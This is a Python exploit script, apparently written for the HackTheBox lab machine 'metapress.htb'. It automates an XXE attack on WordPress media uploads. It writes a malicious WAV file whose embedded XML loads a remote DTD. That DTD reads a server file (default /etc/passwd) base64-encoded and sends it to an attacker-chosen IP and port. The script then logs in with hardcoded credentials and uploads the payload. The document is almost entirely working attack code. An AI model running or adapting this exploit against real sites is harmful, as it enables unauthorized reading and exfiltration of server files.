#!/usr/bin/python3

import argparse
import requests
import signal
import base64
import re

# Program Functions
# --------------------+
# --- Control CTRL+C exit
def forced_exit(sig, frame):
    print("\nSaliendo...")
    exit(0)

signal.signal(signal.SIGINT, forced_exit)

# --- Program arguments
def arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', required=True, dest="internal_ip", help="IP para levantar servidor web")
    parser.add_argument('-p', '--port', dest="internal_port", default=8999, help="Puerto para levantar servidor web (default: 8999)")
    parser.add_argument('-f', '--file', dest="file_name_lfi", default='/etc/passwd', help="Archivo del sistema a consultar (default: /etc/passwd)")
    return parser.parse_args()

# Classes
# --------------------+
class WordpressXXEwithLFI:

    def __init__(self):
        self.url = "http://metapress.htb"
        self.session = requests.Session()

    def generate_wav_file(self, internal_ip, internal_port):
        file_wav_name = "payload.wav"
        file_wav_content = open(file_wav_name,'w')

        # If you have problems, replace the line below with this one: #payload = """RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?>"""
        payload = """RIFF\xb8\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?>"""
        payload += f"""<!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{internal_ip}:{int(internal_port)}/xxe.dtd'>%remote;%init;%trick;] >\x00"""

        file_wav_content.write(payload)
        file_wav_content.close()

        print("(+) wav file created with name:", file_wav_name)
        return file_wav_name

    def generate_dtd_file(self, internal_ip, internal_port, file_name_lfi):
        file_dtd_name = "xxe.dtd"
        file_dtd_content = open(file_dtd_name,'w')

        payload = f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={file_name_lfi}">""" + "\n"
        payload += f"""<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://{internal_ip}:{int(internal_port)}/?content=%file;'>">"""

        file_dtd_content.write(payload)
        file_dtd_content.close()

        print("(+) dtd file created with name:", file_dtd_name)

    def wordpress_login(self):
        cookies = {"wordpress_test_cookie": "WP%20Cookie%20check"}
        data_post = {
            "log": "manager",
            "pwd": "partylikearockstar",
            "wp-submit": "Log+In",
            "redirect_to": "http://metapress.htb/wp-admin/",
            "testcookie": "1"
        }
        r = self.session.post(self.url + '/wp-login.php', cookies=cookies, data=data_post)

        if r.url != "http://metapress.htb/wp-admin/profile.php":
            print("(-) Login error, test credentials and connection")
            exit(1)

        print("(+) Login as user manager in WordPress")

    def wordpress_upload_wav(self, file_wav_name):
        r = self.session.get(self.url + '/wp-admin/upload.php')
        wp_nonce = re.findall(r'upload-attachment","_wpnonce":"(.*?)"', r.text)[0]

        data_file = {"async-upload": (file_wav_name, open(file_wav_name, 'rb'), 'audio/x-wav')}
        data_post = {"name": file_wav_name, "action": "upload-attachment", "_wpnonce": wp_nonce}

        #proxy = {"http": "http://127.0.0.1:8080"}
        r = self.session.post(self.url + '/wp-admin/async-upload.php', data=data_post, files=data_file)
        r = self.session.get(self.url + '/wp-admin/audio.php')

        print("(+) Upload wav file, review your server to extract the content of file")

    def main(self):
        args = arguments()

        banner = base64.b64decode("CuKVk+KVluKVk+KVluKVk+KUgOKUgCDilZPilIDilIDilZbilZPilIDilIDilZbilZPilIDilIDilZbilaXilZPilZbilaXilZPilIDilIDilZYK4pWR4pWR4pWr4pWR4pWRICAg4pWZIOKVkeKVnOKVkSAg4pWr4pWZIOKVkeKVnOKVkeKVq+KVkeKVkeKVkSAg4pWRCuKVkeKVkeKVq+KVkeKVq+KUgOKUgCAgIOKVkSDilZHilIDilIDilaIgIOKVkSDilZHilavilZHilZHilasgIOKVkQrilajilZnilZzilajilZnilIDilIDilIAg4pSA4pWoIOKVqCAg4pWoIOKUgOKVqCDilZnilZzilZnilZzilZnilIDilIDilZzigKIgYnkgbGFuegoKQXV0b21hdGl6YXRpb24gY3JlYXRlIFdBViBhbmQgRFREIGZpbGVzIHRvIHJldHJpZXZlIGludGVybmFsIGZpbGVzIHdpdGggWFhFCg==").decode()
        print(banner)

        # Generate internal files
        file_wav_name = self.generate_wav_file(args.internal_ip, args.internal_port)
        self.generate_dtd_file(args.internal_ip, args.internal_port, args.file_name_lfi)

        # Login and upload wav file
        self.wordpress_login()
        self.wordpress_upload_wav(file_wav_name)

# Init Init Init
# --------------------+
if __name__ == '__main__':
    WordpressXXEwithLFI().main()